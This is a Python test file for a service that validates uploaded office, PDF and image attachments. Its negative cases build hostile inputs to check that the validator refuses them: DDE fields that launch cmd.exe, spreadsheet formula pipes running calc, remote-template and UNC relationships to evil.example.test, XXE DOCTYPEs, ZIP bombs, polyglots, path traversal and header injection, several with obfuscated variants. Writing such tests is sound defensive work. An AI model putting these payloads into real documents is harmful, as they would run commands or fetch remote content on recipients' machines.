"""RFQATT - the FILE side of request attachments (services/tickets/rfq_files.py; RFQ contract section 19.2), negative cases first: the
allow-list by content (never the name or the declared type), polyglots and mismatched types, path traversal and control characters in
names, the office package refusals (macros, ActiveX, embedded objects, external relationships, DDE, ZIP bombs, encryption,
prepended / appended bytes, duplicate and unsafe entry names), WebP only as a still image with its metadata dropped, decompression
bombs, and the serving headers. Every name here is invented."""
from __future__ import annotations

import io
import struct
import zipfile
import zlib

import pytest
from PIL import Image

from smplwise.services.tickets import image_intake as ii
from smplwise.services.tickets import rfq_files as rf
from smplwise.services.tickets.image_intake import IntakeError
from test_tickets_cost_files import pdf

CT_DOCX = (b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
           b'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
           b'<Default Extension="xml" ContentType="application/xml"/><Default Extension="png" ContentType="image/png"/>'
           b'<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
CT_XLSX = CT_DOCX.replace(b"/word/document.xml", b"/xl/workbook.xml").replace(
    b"wordprocessingml.document.main+xml", b"spreadsheetml.sheet.main+xml")
RELS = (b'<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
        b'</Relationships>')
DOC = b'<?xml version="1.0"?><w:document xmlns:w="w"><w:body><w:p><w:r><w:t>Scope of work</w:t></w:r></w:p></w:body></w:document>'


def office(parts: dict[str, bytes] | None = None, *, kind: str = "docx", drop: tuple[str, ...] = (), extra: dict[str, bytes] | None = None,
           compression: int = zipfile.ZIP_DEFLATED) -> bytes:
    base = {"[Content_Types].xml": CT_DOCX, "_rels/.rels": RELS, "word/document.xml": DOC,
            "word/_rels/document.xml.rels": RELS.replace(b"officeDocument\" Target=\"word/document.xml", b"styles\" Target=\"styles.xml")}
    if kind == "xlsx":
        base = {"[Content_Types].xml": CT_XLSX, "_rels/.rels": RELS.replace(b"word/document.xml", b"xl/workbook.xml"),
                "xl/workbook.xml": b'<?xml version="1.0"?><workbook/>',
                "xl/worksheets/sheet1.xml": b'<?xml version="1.0"?><worksheet><sheetData><row><c r="A1"><f>SUM(B1:B2)</f></c></row></sheetData></worksheet>'}
    base.update(parts or {})
    base.update(extra or {})
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression) as z:
        for name, body in base.items():
            if name not in drop:
                z.writestr(name, body)
    return buf.getvalue()


def with_types(ct: bytes, *, default: tuple[str, str] | None = None, override: tuple[str, str] | None = None) -> bytes:
    """[Content_Types].xml with one more Default (extension, type) and / or Override (part name, type) INSIDE <Types>."""
    extra = b""
    if default:
        extra += f'<Default Extension="{default[0]}" ContentType="{default[1]}"/>'.encode()
    if override:
        extra += f'<Override PartName="/{override[0]}" ContentType="{override[1]}"/>'.encode()
    return ct.replace(b"</Types>", extra + b"</Types>")


def refused(data: bytes, code: str, status: int = 422) -> None:
    with pytest.raises(IntakeError) as e:
        _check(data)
    assert (e.value.code, e.value.status) == (code, status), e.value.code


def _check(data: bytes) -> str:
    coarse = rf.check_size(data)
    if coarse == "office":
        return rf.check_office(data).kind
    if coarse == "pdf":
        rf.check_pdf(data)  # cost_files.check_pdf + the structure rules of review F3
        return "pdf"
    ii.reencode(data, allow_webp=True)
    return "image"


def jpeg(w: int = 320, h: int = 240, **save) -> bytes:
    buf = io.BytesIO()
    Image.new("RGB", (w, h), (200, 30, 30)).save(buf, "JPEG", **save)
    return buf.getvalue()


def webp(w: int = 64, h: int = 48, **save) -> bytes:
    buf = io.BytesIO()
    Image.new("RGBA" if save.pop("alpha", False) else "RGB", (w, h), (20, 120, 220)).save(buf, "WEBP", **save)
    return buf.getvalue()


# ---------------------------------------------------------------- the allow-list by content

@pytest.mark.parametrize("head, code", [
    (b"GIF89a" + b"\x00" * 64, "unsupported_format"), (b"BM" + b"\x00" * 64, "unsupported_format"),
    (b"II*\x00" + b"\x00" * 64, "unsupported_format"), (b"MZ\x90\x00" + b"\x00" * 64, "unsupported_format"),
    (b"<html><script>alert(1)</script></html>", "unsupported_format"), (b"<?xml version='1.0'?><svg/>", "unsupported_format"),
    (b"\x00\x00\x00\x18ftypheic" + b"\x00" * 64, "heic_refused"), (b"#!/bin/sh\nrm -rf /\n", "unsupported_format"),
])
def test_anything_outside_the_allow_list_is_refused_by_content(head, code):
    refused(head, code, 415)


def test_the_name_and_the_declared_type_are_never_trusted():
    # a picture called "plan.pdf" is a picture: re-encoded, stored and named .jpg
    assert rf.kind_of(jpeg()) == "image"
    assert rf.display_name("plan.pdf", "image") == "plan.jpg"
    # a script called "photo.jpg" is refused (no magic of an allowed type)
    with pytest.raises(IntakeError) as e:
        rf.kind_of(b"<script>alert(1)</script>")
    assert e.value.status == 415


def test_size_rules_per_kind():
    with pytest.raises(IntakeError) as e:
        rf.check_size(b"\xff\xd8\xff" + b"\x00" * (rf.IMAGE_MAX_BYTES + 1))
    assert (e.value.code, e.value.status, e.value.details["max_bytes"]) == ("too_large", 413, rf.IMAGE_MAX_BYTES)
    with pytest.raises(IntakeError) as e:
        rf.check_size(b"%PDF-1.7\n" + b"\x00" * rf.DOCUMENT_MAX_BYTES)
    assert e.value.code == "too_large" and e.value.details["max_bytes"] == rf.DOCUMENT_MAX_BYTES
    with pytest.raises(IntakeError):
        rf.check_size(b"")


def test_polyglots_lose_their_payload_or_are_refused(tmp_path):
    # a JPEG with a ZIP appended (the classic picture/archive polyglot): only a fresh JPEG is ever stored
    payload = office()
    poly = jpeg() + payload
    s = rf.store(tmp_path, "rfq1", poly)
    stored = (tmp_path / s.rel_path).read_bytes()
    assert s.kind == "image" and b"PK\x03\x04" not in stored and b"word/document.xml" not in stored
    # a PDF with a ZIP appended after %%EOF: the trailer is no longer at the end -> refused
    refused(pdf() + payload, "pdf_invalid")
    # a ZIP that starts with a PDF header is judged as a PDF (and has no trailer)
    refused(b"%PDF-1.4\n" + payload, "pdf_invalid")
    # an office package with bytes before its first entry or after its directory
    refused(b"PK\x03\x04" + b"\x00" * 26 + payload, "office_invalid")
    refused(payload + b"%PDF-1.4 trailing", "office_invalid")


# ---------------------------------------------------------------- office packages

def test_a_plain_docx_and_xlsx_are_accepted(tmp_path):
    assert rf.check_office(office()).kind == "docx"
    assert rf.check_office(office(kind="xlsx")).kind == "xlsx"
    s = rf.store(tmp_path, "rfq1", office(kind="xlsx"))
    assert s.kind == "xlsx" and s.thumb_rel is None and s.rel_path.startswith("rfq1/rfq/") and s.rel_path.endswith(".xlsx")
    # a hyperlink is the one external relationship a document may carry
    link = (b'<Relationships xmlns="r"><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
            b'Target="https://example.test/spec" TargetMode="External"/></Relationships>')
    assert rf.check_office(office({"word/_rels/document.xml.rels": link})).kind == "docx"
    # printer settings are the one .bin a package may carry
    printer = with_types(CT_XLSX, default=("bin", "application/vnd.openxmlformats-officedocument.spreadsheetml.printerSettings"))
    assert rf.check_office(office({"[Content_Types].xml": printer}, kind="xlsx",
                                  extra={"xl/printerSettings/printerSettings1.bin": b"\x00" * 64})).kind == "xlsx"


@pytest.mark.parametrize("extra", [
    {"word/vbaProject.bin": b"\xd0\xcf\x11\xe0"},
    {"word/vbaData.xml": b"<x/>"},
    {"word/activeX/activeX1.xml": b"<x/>"},
    {"word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0"},
    {"word/embeddings/Microsoft_Excel_Worksheet.xlsx": b"PK"},
    {"word/media/run.exe": b"MZ"},
    {"word/media/x.js": b"alert(1)"},
    {"customXml/item1.bin": b"\x00"},
])
def test_active_content_and_embedded_objects_are_refused(extra):
    refused(office(extra=extra), "office_refused")


def test_macro_content_types_and_refused_relationships():
    # a refused type DECLARED in [Content_Types].xml is refused even when no part uses it
    refused(office({"[Content_Types].xml": with_types(CT_DOCX, default=("bin", "application/vnd.ms-office.vbaProject"))}), "office_refused")
    refused(office({"[Content_Types].xml": CT_DOCX.replace(b"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
                                                           b"application/vnd.ms-word.document.macroEnabled.main+xml")}), "office_refused")
    # a remote template (the "template injection" shape), an external OLE / frame link
    for rtype in (b"attachedTemplate", b"oleObject", b"frame", b"subDocument"):
        rel = (b'<Relationships xmlns="r"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
               + rtype + b'" Target="https://example.test/t.dotm" TargetMode="External"/></Relationships>')
        refused(office({"word/_rels/settings.xml.rels": rel}), "office_refused")
    # any other EXTERNAL relationship (an externally linked picture)
    rel = (b'<Relationships xmlns="r"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
           b'Target="https://example.test/x.png" TargetMode="External"/></Relationships>')
    refused(office({"word/_rels/document.xml.rels": rel}), "office_refused")
    # external workbook links / DDE links in a spreadsheet
    refused(office(kind="xlsx", extra={"xl/externalLinks/externalLink1.xml": b"<externalLink><ddeLink/></externalLink>"}), "office_refused")


def test_dde_fields_formula_pipes_and_dtds_are_refused():
    refused(office({"word/document.xml": DOC.replace(b"<w:t>Scope of work</w:t>", b'<w:instrText> DDEAUTO c:\\\\windows\\\\cmd.exe "/k calc"</w:instrText>')}),
            "office_refused")
    refused(office({"word/document.xml": DOC.replace(b"Scope", b'<w:fldSimple w:instr="DDE Excel"/>')}), "office_refused")
    refused(office(kind="xlsx", parts={"xl/worksheets/sheet1.xml": b"<worksheet><sheetData><row><c><f>cmd|' /C calc'!A0</f></c></row></sheetData></worksheet>"}),
            "office_refused")
    refused(office({"word/document.xml": b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa">]><w:document/>'}), "office_refused")
    refused(office({"_rels/.rels": b'<!DOCTYPE r SYSTEM "http://example.test/x.dtd">' + RELS}), "office_refused")


def test_package_structure_refusals():
    refused(office(drop=("[Content_Types].xml",)), "office_invalid")
    refused(office(drop=("word/document.xml",)), "office_invalid")
    both = office(extra={"xl/workbook.xml": b"<workbook/>"})
    refused(both, "office_invalid")
    # a ZIP that is not an office document at all
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("readme.txt", "hello")
    refused(buf.getvalue(), "office_invalid")


@pytest.mark.parametrize("name", ["../evil.xml", "/abs.xml", "word\\..\\x.xml", "C:/x.xml", "word/../../x.xml"])
def test_path_traversal_entry_names_are_refused(name):
    refused(office(extra={name: b"<x/>"}), "office_invalid")


def test_duplicate_entry_names_are_refused():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n, b in (("[Content_Types].xml", CT_DOCX), ("_rels/.rels", RELS), ("word/document.xml", DOC)):
            z.writestr(n, b)
        import warnings

        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            z.writestr("WORD/Document.xml", DOC)  # the same name for a case-insensitive reader
    refused(buf.getvalue(), "office_invalid")


def test_a_zip_bomb_is_refused_from_its_directory_before_inflating():
    big = b"\x00" * (rf.OFFICE_MAX_UNCOMPRESSED // 4)  # compresses ~1000:1
    refused(office(extra={"word/media/a.xml": big}), "office_refused")
    # declared sizes over the total cap
    many = {f"word/media/p{i}.xml": b"\x00" * (30 * 1024 * 1024) for i in range(4)}
    refused(office(extra=many), "office_refused")


def test_encrypted_entries_and_unknown_compression_are_refused():
    data = bytearray(office())
    # set the "encrypted" flag on the central directory entry of the document part
    at = data.find(b"PK\x01\x02")
    while at >= 0:
        flags = struct.unpack("<H", data[at + 8:at + 10])[0]
        data[at + 8:at + 10] = struct.pack("<H", flags | 0x1)
        at = data.find(b"PK\x01\x02", at + 4)
    refused(bytes(data), "office_refused")


# ---------------------------------------------------------------- pictures (the ONE image pipeline, WebP opt-in)

def test_webp_is_refused_by_default_and_accepted_for_the_manager_only():
    data = webp()
    with pytest.raises(IntakeError) as e:
        ii.reencode(data)
    assert e.value.code == "webp_refused"  # the public routes keep refusing it
    out = ii.reencode(data, allow_webp=True)
    assert out.data.startswith(b"\xff\xd8\xff") and (out.width, out.height) == (64, 48)


def test_webp_with_alpha_and_metadata_is_flattened_and_stripped():
    data = webp(alpha=True, exif=b"Exif\x00\x00MM\x00*GPS-SECRET", lossless=False)
    layout = ii.webp_layout(data)
    assert b"EXIF" not in layout.clean and b"GPS-SECRET" not in layout.clean
    out = ii.reencode(data, allow_webp=True)
    assert b"GPS-SECRET" not in out.data and b"Exif" not in out.data


def test_animated_webp_and_broken_riff_are_refused():
    frames = [Image.new("RGB", (16, 16), c) for c in ((255, 0, 0), (0, 255, 0))]
    buf = io.BytesIO()
    frames[0].save(buf, "WEBP", save_all=True, append_images=frames[1:], duration=100)
    with pytest.raises(IntakeError) as e:
        ii.reencode(buf.getvalue(), allow_webp=True)
    assert (e.value.code, e.value.status) == ("unsupported_format", 415)
    data = bytearray(webp())
    data[4:8] = struct.pack("<I", len(data) * 4)  # a RIFF size past the end
    with pytest.raises(IntakeError) as e:
        ii.reencode(bytes(data), allow_webp=True)
    assert e.value.code == "image_invalid"


def test_decompression_bombs_are_refused_from_the_header():
    # a WebP whose lossless header claims 16384 x 16384 (268 MP)
    vp8l = bytes([0x2F]) + struct.pack("<I", (16383) | (16383 << 14)) + b"\x00" * 16
    body = b"WEBP" + b"VP8L" + struct.pack("<I", len(vp8l)) + vp8l
    with pytest.raises(IntakeError) as e:
        ii.reencode(b"RIFF" + struct.pack("<I", len(body)) + body, allow_webp=True)
    assert e.value.code == "too_many_pixels"
    # a PNG whose IHDR claims 30000 x 30000 behind a tiny compressed IDAT
    raw = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", 30000, 30000, 8, 2, 0, 0, 0)
    raw += struct.pack(">I", 13) + b"IHDR" + ihdr + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr))
    idat = zlib.compress(b"\x00" * 1024)
    raw += struct.pack(">I", len(idat)) + b"IDAT" + idat + struct.pack(">I", zlib.crc32(b"IDAT" + idat))
    raw += struct.pack(">I", 0) + b"IEND" + struct.pack(">I", zlib.crc32(b"IEND"))
    with pytest.raises(IntakeError) as e:
        ii.reencode(raw, allow_webp=True)
    assert e.value.code == "too_many_pixels"


def test_a_stored_picture_has_a_fresh_jpeg_and_a_small_thumbnail(tmp_path):
    s = rf.store(tmp_path, "rfq1", jpeg(3000, 2000, quality=90))
    assert s.kind == "image" and s.mime == "image/jpeg" and max(s.width, s.height) <= 2048
    with Image.open(tmp_path / s.thumb_rel) as t:
        assert max(t.size) <= rf.THUMB_SIDE and t.format == "JPEG" and not t.info.get("exif")
    assert rf.path_of(tmp_path, s.rel_path).is_file() and rf.remove(tmp_path, s.rel_path, s.thumb_rel) == 2


# ---------------------------------------------------------------- names, captions, paths, headers

@pytest.mark.parametrize("raw, kind, expected", [
    ("../../etc/passwd", "pdf", "passwd.pdf"),
    ("..\\..\\windows\\system32\\cmd.exe", "docx", "cmd.docx"),
    ("תוכנית קומה 3.pdf", "pdf", "תוכנית קומה 3.pdf"),
    ("invoice\u202egpj.exe", "pdf", "invoicegpj.pdf"),  # a right-to-left override hiding the real extension
    ("a\x00b\x07c.xlsx", "xlsx", "abc.xlsx"),
    ("CON.pdf", "pdf", "_CON.pdf"),
    ("", "image", "file.jpg"),
    (None, "pdf", "file.pdf"),
    ("...", "pdf", "file.pdf"),
    ('we<ird>:"na|me?*.docx', "docx", "we_ird___na_me__.docx"),
])
def test_display_names_are_cleaned_and_never_a_path(raw, kind, expected):
    assert rf.display_name(raw, kind) == expected


def test_long_names_and_captions():
    assert len(rf.display_name("x" * 500 + ".pdf", "pdf")) == rf.NAME_STEM_MAX + 4
    assert rf.clean_caption("  חזית\u200b הבניין\n\tמצד מערב  ") == "חזית הבניין מצד מערב"
    assert rf.clean_caption(None) == ""
    with pytest.raises(ValueError):
        rf.clean_caption("x" * (rf.CAPTION_MAX + 1))
    with pytest.raises(ValueError):
        rf.clean_caption(42)


@pytest.mark.parametrize("rel", ["../x.pdf", "rfq1/costs/0123456789abcdef.pdf", "rfq1/rfq/../../x.pdf", "rfq1/rfq/0123456789abcdef.exe",
                                 "/etc/passwd", "rfq1\\rfq\\0123456789abcdef.pdf", "rfq1/0123456789abcdef.jpg"])
def test_stored_paths_are_confined_to_the_rfq_folder(tmp_path, rel):
    with pytest.raises(ValueError):
        rf.path_of(tmp_path, rel)


def test_store_refuses_folders_that_could_leave_the_root(tmp_path):
    for folder in ("../x", "a/b", "", "C:"):
        with pytest.raises(ValueError):
            rf.store(tmp_path, folder, pdf())


def test_download_headers_never_inline_a_document_and_quote_the_name():
    h = rf.headers("pdf", ref_number=7, file_id="abc123", name='תוכנית "קומה".pdf')
    assert h["Content-Type"] == "application/pdf" and h["Content-Disposition"].startswith('attachment; filename="rfq-07-abc123.pdf"; filename*=UTF-8\'\'')
    assert '"קומה"' not in h["Content-Disposition"] and "%22" in h["Content-Disposition"]
    assert h["X-Content-Type-Options"] == "nosniff" and h["Content-Security-Policy"] == "sandbox" and "no-store" in h["Cache-Control"]
    for kind in ("docx", "xlsx"):
        assert rf.headers(kind, ref_number=1, file_id="z", name="a").get("Content-Disposition", "").startswith("attachment;")
    img = rf.headers("image", ref_number=7, file_id="abc", name="x.jpg")
    assert img["Content-Type"] == "image/jpeg" and img["Content-Disposition"].startswith("inline;") and img["X-Content-Type-Options"] == "nosniff"
    h = rf.headers("pdf", ref_number=7, file_id="a\r\nSet-Cookie: x=1", name="a\r\nb.pdf")
    assert "\r" not in "".join(h.values()) and "\n" not in "".join(h.values())


# ---------------------------------------------------------------- review 2.6.4 F1: evasion shapes the old regex scans let through
# Every counterexample below is BUILT here (a real ZIP package, real XML): character references, attribute padding, split field
# runs, nested-field obfuscation, formulas outside cells, a DOCTYPE hidden behind a long comment or in UTF-16.

REL_NS = b"http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
W_NS = b'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'


def rels(*rows: bytes) -> bytes:
    return b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' + b"".join(rows) + b"</Relationships>"


def word(body: bytes) -> bytes:
    return b'<?xml version="1.0"?><w:document ' + W_NS + b"><w:body><w:p>" + body + b"</w:p></w:body></w:document>"


def field(*instr_runs: bytes, simple: bytes | None = None) -> bytes:
    """A complex field: begin, one <w:instrText> RUN per item (Word joins them into one field code), separate, a result, end."""
    out = b'<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
    out += b"".join(b"<w:r><w:instrText xml:space=\"preserve\">" + r + b"</w:instrText></w:r>" for r in instr_runs)
    return out + b'<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>x</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>'


def sheet(cells: bytes, ext: bytes = b"") -> bytes:
    return (b'<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
            b'xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><sheetData><row r="1">' + cells + b"</row></sheetData>" + ext + b"</worksheet>")


@pytest.mark.parametrize("row", [
    # 1. character references in the decoded attribute values (Word / System.IO.Packaging decode them)
    b'<Relationship Id="rId1" Type="' + REL_NS + b'attachedTempl&#97;te" Target="https://evil.example.test/t.dotm" TargetMode="External"/>',
    b'<Relationship Id="rId1" Type="' + REL_NS + b'&#x6F;leObject" Target="https://evil.example.test/o.bin" TargetMode="External"/>',
    b'<Relationship Id="rId1" Type="' + REL_NS + b'image" Target="https://evil.example.test/x.png" TargetMode="Extern&#97;l"/>',
    b'<Relationship Id="rId1" Type="' + REL_NS + b'frame" Target="\\\\evil.example.test\\share\\f.htm" TargetMode="&#69;xternal"/>',
    # 2. attribute padding: a start tag far beyond the old 4096-character window (no attribute of it was inspected)
    b"<Relationship" + b" " * 5000 + b'Id="rId1" Type="' + REL_NS + b'attachedTemplate" Target="https://evil.example.test/t.dotm" TargetMode="External"/>',
    b'<Relationship Id="rId' + b"9" * 6000 + b'" Type="' + REL_NS + b'subDocument" Target="https://evil.example.test/s.docx" TargetMode="External"/>',
    # newline / tab padding between the attribute name, the = and the value
    b'<Relationship\n\tId="rId1"\n\tTargetMode\n=\n"External"\n\tType\n=\n"' + REL_NS + b'image"\n\tTarget="https://evil.example.test/x.png"/>',
    # 3. an internal relationship that is really a URL / UNC path
    b'<Relationship Id="rId1" Type="' + REL_NS + b'image" Target="file:///C:/Windows/win.ini"/>',
    b'<Relationship Id="rId1" Type="' + REL_NS + b'image" Target="\\\\evil.example.test\\pixel.png"/>',
])
def test_relationships_are_judged_on_decoded_values_whatever_their_spelling(row):
    refused(office({"word/_rels/settings.xml.rels": rels(row)}), "office_refused")


@pytest.mark.parametrize("body", [
    # DDE split across two instrText runs: Word joins them into DDEAUTO
    field(b"DD", b"EAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\""),
    field(b" D", b"D", b"E ", b"Excel \"x\""),
    # character references inside the field code
    field(b"DDE&#65;UTO c:\\\\windows\\\\cmd.exe"),
    field(b"&#x44;&#x44;&#x45; Excel x"),
    # the attribute form, with a reference
    b'<w:fldSimple w:instr="DD&#69;AUTO cmd /c calc"><w:r><w:t>x</w:t></w:r></w:fldSimple>',
    # the field type built by a nested QUOTE field (the 2017 obfuscation): the outer field has no literal type
    b'<w:r><w:fldChar w:fldCharType="begin"/></w:r>' + field(b"QUOTE 68 68 69 65 85 84 79") +
    b'<w:r><w:instrText> "c:\\\\windows\\\\cmd.exe"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>',
    # fields that fetch or link a remote resource when the vendor opens the document
    field(b"INCLUDEPICTURE \"https://evil.example.test/p.png\" \\d"),
    field(b"INCLUDETEXT \"\\\\\\\\evil.example.test\\\\x.docx\""),
    field(b"LINK Excel.Sheet.8 \"https://evil.example.test/x.xls\" \"\" \\a"),
    # a field code with no field around it (orphaned runs are still read as one code)
    b"<w:r><w:instrText>DD</w:instrText></w:r><w:r><w:instrText>EAUTO x</w:instrText></w:r>",
])
def test_word_field_codes_are_joined_across_runs_and_decoded(body):
    refused(office({"word/document.xml": word(body)}), "office_refused")
    # the same field in a header part is refused too (every Word XML part is parsed, not only document.xml)
    refused(office(extra={"word/header1.xml": word(body).replace(b"w:document", b"w:hdr")}), "office_refused")


def test_harmless_word_fields_still_pass():
    body = (field(b" PAGE ") + field(b'HYPERLINK "https://example.test/spec"') +
            b'<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>IF </w:instrText></w:r>' + field(b"MERGEFIELD Name") +
            b'<w:r><w:instrText> = "x" "a" "b"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>' +
            b'<w:fldSimple w:instr=" NUMPAGES "/><w:r><w:t>hidden text HIDDEN DDE-free</w:t></w:r>')
    assert rf.check_office(office({"word/document.xml": word(body)})).kind == "docx"


@pytest.mark.parametrize("parts", [
    # 4. the pipe behind a character reference
    {"xl/worksheets/sheet1.xml": sheet(b"<c r=\"A1\"><f>cmd&#124;' /C calc'!A0</f></c>")},
    {"xl/worksheets/sheet1.xml": sheet(b"<c r=\"A1\"><f>MSEXCEL&#x7C;'\\..\\..\\Windows\\System32\\cmd.exe'!''</f></c>")},
    # a prefixed formula element and a formula split by an entity-free CDATA section
    {"xl/worksheets/sheet1.xml": sheet(b"<c r=\"A1\"><f><![CDATA[cmd|' /C calc'!A0]]></f></c>")},
    # formulas outside cells: a defined name (never scanned before), data validation, conditional formats, an extension list
    {"xl/workbook.xml": b'<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><definedNames>'
                        b"<definedName name=\"x\">cmd|' /C calc'!A0</definedName></definedNames></workbook>"},
    {"xl/worksheets/sheet1.xml": sheet(b"", b"<dataValidations count=\"1\"><dataValidation sqref=\"A1\"><formula1>cmd|'/c calc'!A0</formula1>"
                                            b"</dataValidation></dataValidations>")},
    {"xl/worksheets/sheet1.xml": sheet(b"", b"<conditionalFormatting sqref=\"A1\"><cfRule type=\"expression\"><formula>cmd|'/c calc'!A0</formula>"
                                            b"</cfRule></conditionalFormatting>")},
    {"xl/worksheets/sheet1.xml": sheet(b"", b"<extLst><ext uri=\"x\"><xm:f>cmd|'/c calc'!A0</xm:f></ext></extLst>")},
    # a DDE link / external reference element outside the externalLinks folder
    {"xl/worksheets/sheet1.xml": sheet(b"", b"<oleObjects><oleObject progId=\"Package\" shapeId=\"1\"/></oleObjects>")},
    {"xl/workbook.xml": b'<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
                        b'xmlns:r="r"><externalReferences><externalReference r:id="rId9"/></externalReferences></workbook>'},
])
def test_spreadsheet_formulas_are_judged_in_every_location(parts):
    refused(office(kind="xlsx", parts=parts), "office_refused")


@pytest.mark.parametrize("part, body", [
    # 5. a DOCTYPE behind 10 KiB of comment (the old scan read the first 8 KiB / 2 KiB only)
    ("word/document.xml", b'<?xml version="1.0"?><!--' + b"x" * 10240 + b'--><!DOCTYPE d [<!ENTITY e SYSTEM "https://evil.example.test/e">]>' + DOC[21:]),
    ("word/styles.xml", b'<?xml version="1.0"?><!--' + b"y" * 20000 + b"--><!DOCTYPE s><styles/>"),
    ("_rels/.rels", b'<?xml version="1.0"?><?pi ' + b"z" * 9000 + b'?><!DOCTYPE r SYSTEM "https://evil.example.test/x.dtd">' + RELS.split(b"?>", 1)[1]),
    # in UTF-16 the raw-byte pattern sees nothing; the parser refuses the declaration itself
    ("word/settings.xml", '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE s [<!ENTITY a "b">]><settings/>'.encode("utf-16")),
])
def test_a_doctype_anywhere_in_any_part_is_refused(part, body):
    refused(office({part: body}), "office_refused")


def test_an_undefined_entity_is_never_expanded():
    refused(office({"word/document.xml": word(b"<w:r><w:t>&xxe;</w:t></w:r>")}), "office_invalid")


# ---------------------------------------------------------------- review 2.6.4 F2: the content-type allow-list

CT_MAIN_DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"


@pytest.mark.parametrize("name, ctype, extra_rel", [
    # altChunk: an MHT / HTML part Word imports on open (the CVE-2021-40444 / CVE-2023-36884 carrier), also under an innocent name
    ("word/afchunk.mht", "message/rfc822", b"aFChunk"),
    ("word/import1.xml", "text/html", None),
    ("word/import2.xml", "application/xhtml+xml", None),
    ("word/notes.xml", "text/plain", None),
    ("word/legacy.xml", "application/rtf", None),
    # EMF / WMF metafiles and SVG pictures (parser-bug carriers), also behind a .png name
    ("word/media/image1.emf", "image/x-emf", None),
    ("word/media/image2.png", "image/x-wmf", None),
    ("word/media/image3.png", "image/svg+xml", None),
    # an embedded font
    ("word/fonts/font1.odttf", "application/vnd.openxmlformats-officedocument.obfuscatedFont", b"font"),
    # an unknown vendor type
    ("word/thing.xml", "application/vnd.example.anything+xml", None),
])
def test_parts_outside_the_content_type_allow_list_are_refused(name, ctype, extra_rel):
    ct = with_types(CT_DOCX, override=(name, ctype))
    parts = {"[Content_Types].xml": ct}
    if extra_rel:
        parts["word/_rels/document.xml.rels"] = rels(b'<Relationship Id="rId7" Type="' + REL_NS + extra_rel + b'" Target="' +
                                                    name.split("/", 1)[1].encode() + b'"/>')
    refused(office(parts, extra={name: b"<x/>"}), "office_refused")


def test_an_altchunk_reference_is_refused_even_when_its_part_looks_like_xml():
    ref = rels(b'<Relationship Id="rId7" Type="' + REL_NS + b'aFChunk" Target="chunk.xml"/>')
    refused(office({"word/_rels/document.xml.rels": ref}, extra={"word/chunk.xml": b"<x/>"}), "office_refused")
    refused(office({"word/document.xml": word(b'<w:altChunk xmlns:r="r" r:id="rId7"/>')}), "office_refused")


def test_a_part_without_a_declared_type_is_refused():
    refused(office(extra={"word/media/blob.qqq": b"\x00\x01"}), "office_refused")


@pytest.mark.parametrize("name, ctype, body", [
    # Excel data connections (OLEDB / ODBC / web queries) and query tables, also under names the old regex did not know
    ("xl/connections.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.connections+xml", b"<connections/>"),
    ("xl/data/c1.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.connections+xml", b"<connections/>"),
    ("xl/queryTables/queryTable1.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.queryTable+xml", b"<queryTable/>"),
    ("xl/qt/q1.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.queryTable+xml", b"<queryTable/>"),
    ("xl/links/l1.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml", b"<externalLink/>"),
    # a pivot cache over an external connection
    ("xl/pivotCache/pivotCacheDefinition1.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.pivotCacheDefinition+xml",
     b'<pivotCacheDefinition xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><cacheSource type="external" connectionId="1"/>'
     b"</pivotCacheDefinition>"),
    # Power Query (the DataMashup customXml item)
    ("customXml/item1.xml", "application/xml", b'<DataMashup xmlns="http://schemas.microsoft.com/DataMashup">AAAA</DataMashup>'),
])
def test_external_data_parts_are_refused(name, ctype, body):
    ct = with_types(CT_XLSX, override=(name, ctype))
    refused(office({"[Content_Types].xml": ct}, kind="xlsx", extra={name: body}), "office_refused")


@pytest.mark.parametrize("rtype", [b"connections", b"queryTable", b"aFChunk", b"font", b"externalLinkPath", b"mailMergeSource", b"webextension"])
def test_refused_relationship_types_in_any_mode(rtype):
